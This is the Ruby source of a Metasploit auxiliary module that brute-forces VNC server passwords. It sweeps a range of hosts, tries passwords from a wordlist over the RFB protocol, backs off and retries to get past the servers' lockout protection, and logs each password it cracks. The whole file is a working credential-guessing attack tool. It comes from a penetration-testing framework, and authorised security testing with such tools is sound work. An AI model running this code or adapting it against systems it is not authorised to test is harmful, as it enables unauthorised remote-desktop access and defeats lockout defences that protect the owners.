##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex/proto/rfb'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::Tcp
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'VNC Authentication Scanner',
            'Description' => %q{
              This module will test a VNC server on a range of machines and
              report successful logins. Currently it supports RFB protocol
              version 3.3, 3.7, and 3.8 using the VNC challenge response
              authentication method.
            },
            'Author'      =>
                [
                    'carstein <carstein.sec [at] gmail [dot] com>',
                    'jduck'
                ],
            'References'     =>
                [
                    [ 'CVE', '1999-0506'] # Weak password
                ],
            'License'     => MSF_LICENSE
        )
    )

    register_options(
      [
        Opt::RPORT(5900),
        OptString.new('PASSWORD', [ false, 'The password to test' ]),
        OptPath.new('PASS_FILE',  [ false, "File containing passwords, one per line",
          File.join(Msf::Config.data_directory, "wordlists", "vnc_passwords.txt") ]),

        #We need to set the following options to make sure BLANK_PASSWORDS functions properly
        OptString.new('USERNAME', [false, 'A specific username to authenticate as', '<BLANK>']),
        OptBool.new('USER_AS_PASS', [false, 'Try the username as the password for all users', false])
      ], self.class)

    register_autofilter_ports((5900..5910).to_a) # Each instance increments the port by one.

    # We don't currently support an auth mechanism that uses usernames, so we'll ignore any
    # usernames that are passed in.
    @strip_usernames = true
  end

  def run_host(ip)
    print_status("#{ip}:#{rport} - Starting VNC login sweep")

    begin
      each_user_pass { |user, pass|
        ret = nil
        attempts = 5
        attempts.times { |n|
          ret = do_login(user, pass)
          break if ret != :retry

          delay = (2**(n+1)) + 1
          vprint_status("Retrying in #{delay} seconds...")
          select(nil, nil, nil, delay)
        }
        # If we tried all these attempts, and we still got a retry condition,
        # we'll just give up.. Must be that nasty blacklist algorithm kicking
        # our butt.
        return :abort if ret == :retry
        ret
      }
    rescue ::Rex::ConnectionError
      nil
    end
  end

  def do_login(user, pass)
    vprint_status("#{target_host}:#{rport} - Attempting VNC login with password '#{pass}'")

    connect

    begin
      vnc = Rex::Proto::RFB::Client.new(sock, :allow_none => false)
      if not vnc.handshake
        vprint_error("#{target_host}:#{rport}, #{vnc.error}")
        return :abort
      end

      ver = "#{vnc.majver}.#{vnc.minver}"
      vprint_status("#{target_host}:#{rport}, VNC server protocol version : #{ver}")
      report_service(
        :host => rhost,
        :port => rport,
        :proto => 'tcp',
        :name => 'vnc',
        :info => "VNC protocol version #{ver}"
      )

      if not vnc.authenticate(pass)
        vprint_error("#{target_host}:#{rport}, #{vnc.error}")
        return :retry if vnc.error =~ /connection has been rejected/ # UltraVNC
        return :retry if vnc.error =~ /Too many security failures/   # vnc4server
        return :fail
      end

      print_good("#{target_host}:#{rport}, VNC server password : \"#{pass}\"")

      access_type = "password"
      #access_type = "view-only password" if vnc.view_only_mode
      report_auth_info({
        :host => rhost,
        :port => rport,
        :sname => 'vnc',
        :pass => pass,
        :type => access_type,
        :duplicate_ok => true,
        :source_type => "user_supplied",
        :active => true
      })
      return :next_user

    # For debugging only.
    #rescue ::Exception
    #	raise $!
    #	print_error("#{$!}")

    ensure
      disconnect()
    end
  end

end
